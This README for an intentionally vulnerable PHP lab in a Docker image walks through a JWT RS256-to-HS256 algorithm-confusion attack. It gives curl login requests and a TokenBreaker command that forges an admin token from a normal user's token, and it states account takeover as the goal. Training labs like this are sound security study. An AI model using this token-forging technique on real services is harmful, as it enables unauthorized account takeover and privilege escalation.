## Php-Jwt-Substitution-Attack_Rsa256_to_Hs256


JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA.

https://jwt.io/

## Owasp 

https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_and_Securing_JWT.pdf

https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html


## Setup

install from my dockerhub : https://hub.docker.com/r/mhnamadi/jwt-php-rsa256tohs256


    docker run -tid -p 9090:80 mhnamadi/jwt-php-rsa256tohs256
    
    docker ps 
    
    docker exec -it ContainerID bash 
    
    service apache2 start
    
    service mysql start 
    
    Done :))    
    
## Description 

         We have 2 account securestore:securestore and admin:admin 
    
         We want to account takeover from securestore to admin account with this attack

## Payload 
  
        Login to securestore and get jwt RSA256
        

1. curl -i -s -k -X $'POST' -H $'Host: 192.168.1.104:9090' -H $'Content-Type: application/json' -H $'Content-Length: 69' -H $'User-Agent:Mozilla/5.0(Macintosh; Intel Mac OS X 10.15;rv:97.0) Gecko/20100101 Firefox/97.0' --data-binary $'{\"name\": \"login\",\"param\":{\"user\":\"securestore\",\"pass\":\"securestore\"}}' $'http://192.168.1.104:9090/v3/'

![Getting Started](80.png)


        Login to admin and get jwt RSA256
        
        
2. curl -i -s -k -X $'POST' -H $'Host: 192.168.1.104:9090' -H $'Content-Type: application/json' -H $'Content-Length: 57' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0' --data-binary $'{\"name\": \"login\",\"param\":{\"user\":\"admin\",\"pass\":\"admin\"}}' $'http://192.168.1.104:9090/v3/'

![Getting Started](81.png)

3. the first is fuzzing on JWT token securestore and admin account 

![Getting Started](82.png)


![Getting Started](83.png)


4. We want to add "userId":"admin","isAdmin":"true" to secure store account 

        TokenBreaker is one of the best tools for JWT Attack
    
5. https://github.com/cyberblackhole/TokenBreaker    

## Attack 

        Use JWT securestore token and change payload
  
mhs-MacBook-Pro:TokenBreaker mhn$ python3 RsaToHmac.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2NDU0Nzc0NjYsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTY0NTQ4NjQ2NiwidXNlcklkIjoic2VjdXJlc3RvcmUiLCJpc0FkbWluIjoiZmFsc2UifQ.NX6p76T2p5-DfhJcLHTJ64F_-xv6pl1iRFCrm4gDM-UPNpjmm2_1F0pfplcfrlIJEDgBQnMPe3245RLXk_gMWstJ1T3QehJIOMcBTruxbwzOUaOdF3IY-eBfeLgH0854xYnf0MW6rtezWD4a66VecsmjV3sUtRUcujF5ytpx_zqdAyEKT7dZTNLo-Wi8hTszLVhEFy_amLfIKOoWsDh43To3bvJU6OJZ1m8zAFc3Ur87GrL92wv1TToDDvmdrF9uubuZxD1tW6pek0U--DQLmcgegsKLl4_JPQNdxfmS5Eycku09IaA-4a68nrEZOPfyq-1-0lTaB_xlcDVQfFAT-g -p public.pem 

[<] Enter Your Payload value: {"iat":1645479477,"iss":"localhost","exp":1645488477,"userId":"admin","isAdmin":"true"}

[+] Successfully Encoded Token: 

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDU0Nzk0NzcsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTY0NTQ4ODQ3NywidXNlcklkIjoiYWRtaW4iLCJpc0FkbWluIjoidHJ1ZSJ9.MdUsaQIPcVsIggim6PKt91wTsTFcWQwwwI5UIX048i8


![Getting Started](84.png)

## Fix 

We encourage you to contribute to Project and Fix Codes

If you want to pull request please follow this :

CONTRIBUTION.md

## Twitter & Facebook Contributor :
   
 https://www.linkedin.com/in/mohammad-hussein-namadi-775baa131/
 
